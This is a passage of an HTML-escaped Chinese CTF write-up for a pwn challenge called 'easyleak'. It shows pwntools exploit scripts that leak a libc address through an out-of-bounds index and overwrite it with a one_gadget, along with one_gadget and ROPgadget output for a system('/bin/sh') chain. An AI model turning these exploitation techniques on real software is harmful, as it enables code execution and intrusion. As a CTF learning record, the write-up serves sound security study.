class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(libcbase3))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;write1&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;index,num&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    high_num = &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(num/(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;**&lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    low_num  = num%(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;**&lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;gt; &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Idx:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(index))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Num:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(low_num))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;gt; &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Idx:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(index+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Num:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(high_num))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h2 id=&#34;one-gadget解法&#34;&gt;&lt;a href=&#34;#one-gadget解法&#34; class=&#34;headerlink&#34; title=&#34;one_gadget解法&#34;&gt;&lt;/a&gt;one_gadget解法&lt;/h2&gt;&lt;p&gt;​		题目有给libc版本,但是感觉好像不对啊… 给的是2.27,其实是2.31-0ubuntu9.7_amd64&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;root@vultr:~/yuesai/easyleak# one_gadget /root/pwn/glibc-all-in-one/libs/&lt;span class=&#34;number&#34;&gt;2.31&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-0u&lt;/span&gt;buntu9&lt;span class=&#34;number&#34;&gt;.7&lt;/span&gt;_amd64/libc.so&lt;span class=&#34;number&#34;&gt;.6&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xe3b2e&lt;/span&gt; execve(&lt;span class=&#34;string&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;, r15, r12)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;constraints:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [r15] == &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt; || r15 == &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [r12] == &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt; || r12 == &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xe3b31&lt;/span&gt; execve(&lt;span class=&#34;string&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;, r15, rdx)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;constraints:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [r15] == &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt; || r15 == &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [rdx] == &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt; || rdx == &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xe3b34&lt;/span&gt; execve(&lt;span class=&#34;string&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;, rsi, rdx)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;constraints:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [rsi] == &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt; || rsi == &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [rdx] == &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt; || rdx == &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;exp&#34;&gt;&lt;a href=&#34;#exp&#34; class=&#34;headerlink&#34; title=&#34;exp&#34;&gt;&lt;/a&gt;exp&lt;/h3&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(os=&lt;span class=&#34;string&#34;&gt;&amp;#x27;linux&amp;#x27;&lt;/span&gt;,log_level=&lt;span class=&#34;string&#34;&gt;&amp;#x27;debug&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mylibc = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;/root/pwn/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc.so.6&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io = process(&lt;span class=&#34;string&#34;&gt;&amp;quot;./pwn&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.terminal = [&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmux&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;splitw&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;-h&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#gdb.attach(io)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;read1&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;index&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;gt; &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Idx:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(index))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;The num: &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    low_addr=&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;\n&amp;#x27;&lt;/span&gt;,drop=&lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;),&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;# 这样就可以接收到全部了,不用考虑长度,到\n截止,10进制接收&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;gt; &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Idx:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(index+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;The num: &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    high_addr=&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;\n&amp;#x27;&lt;/span&gt;,drop=&lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;),&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; high_addr*(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;**&lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;)+low_addr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;write1&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;index,num&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    high_num = &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(num/(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;**&lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    low_num  = num%(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;**&lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;gt; &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Idx:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(index))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Num:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(low_num))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;gt; &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Idx:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(index+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Num:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(high_num))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libcbase = read1(&lt;span class=&#34;number&#34;&gt;262&lt;/span&gt;) - &lt;span class=&#34;number&#34;&gt;0x240b3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#print(hex(libcbase3))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onegadget = libcbase + &lt;span class=&#34;number&#34;&gt;0xe3b31&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;write1(&lt;span class=&#34;number&#34;&gt;262&lt;/span&gt;,onegadget)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;gt; &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		&lt;font color=&#34;red&#34;&gt;不对不对..其实不是这个libc版本,所以onegadget是瞎猫碰死耗子,撞上了….(或者说他前面的指令不影响后续getshell)&lt;/font&gt;&lt;/p&gt;
&lt;h2 id=&#34;system解法&#34;&gt;&lt;a href=&#34;#system解法&#34; class=&#34;headerlink&#34; title=&#34;system解法&#34;&gt;&lt;/a&gt;system解法&lt;/h2&gt;&lt;p&gt;找到&amp;#x2F;bin&amp;#x2F;sh和system 以及gadget&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ROPgadget --binary libc.so&lt;span class=&#34;number&#34;&gt;.6&lt;/span&gt; --only &lt;span class=&#34;string&#34;&gt;&amp;#x27;pop|ret&amp;#x27;&lt;/span&gt; | grep &lt;span class=&#34;string&#34;&gt;&amp;#x27;rdi&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x00000000000248f2&lt;/span&gt; : pop rdi ; pop rbp ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x0000000000023b6a&lt;/span&gt; : pop rdi ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ROPgadget --binary libc.so&lt;span class=&#34;number&#34;&gt;.6&lt;/span&gt;  --&lt;span class=&#34;built_in&#34;&gt;string&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;/bin/sh&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x00000000001b45bd&lt;/span&gt; : /bin/sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ROPgadget --binary libc.so&lt;span class=&#34;number&#34;&gt;.6&lt;/span&gt; --only &lt;span class=&#34;string&#34;&gt;&amp;#x27;ret&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x0000000000022679&lt;/span&gt; : ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system = libcbase + mylibc.symbols[&lt;span class=&#34;string&#34;&gt;&amp;#x27;system&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(os=&lt;span class=&#34;string&#34;&gt;&amp;#x27;linux&amp;#x27;&lt;/span&gt;,log_level=&lt;span 